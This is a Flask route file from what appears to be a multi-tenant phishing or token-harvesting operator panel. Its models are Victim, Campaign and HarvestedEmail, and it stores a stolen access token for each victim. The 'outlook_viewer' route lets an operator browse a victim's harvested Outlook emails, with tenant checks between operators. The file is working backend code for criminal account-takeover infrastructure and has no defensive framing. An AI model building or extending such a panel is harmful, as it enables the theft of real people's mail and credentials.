# app/routes/panel.py

from flask import Blueprint, render_template, request, flash, redirect, url_for
from flask_login import login_required, current_user
from app.extensions import db
from app.models import Victim, Campaign, HarvestedEmail
import requests

panel_bp = Blueprint('panel', __name__)

@panel_bp.route('/outlook_viewer/<int:victim_id>')
@login_required
def outlook_viewer(victim_id):
    victim = Victim.query.get_or_404(victim_id)
    campaign = Campaign.query.get(victim.campaign_id)
    if campaign.tenant_id != current_user.tenant_id and current_user.role != 'admin':
        flash('Unauthorized access.', 'danger')
        return redirect(url_for('operator.dashboard'))
    
    if not victim.access_token:
        flash('No token available for this victim.', 'warning')
        return redirect(url_for('operator.dashboard'))
    
    # Optionally fetch emails on the fly or show harvested ones
    harvested_emails = HarvestedEmail.query.filter_by(victim_id=victim.id).all()
    
    return render_template('outlook_viewer.html', victim=victim, emails=harvested_emails)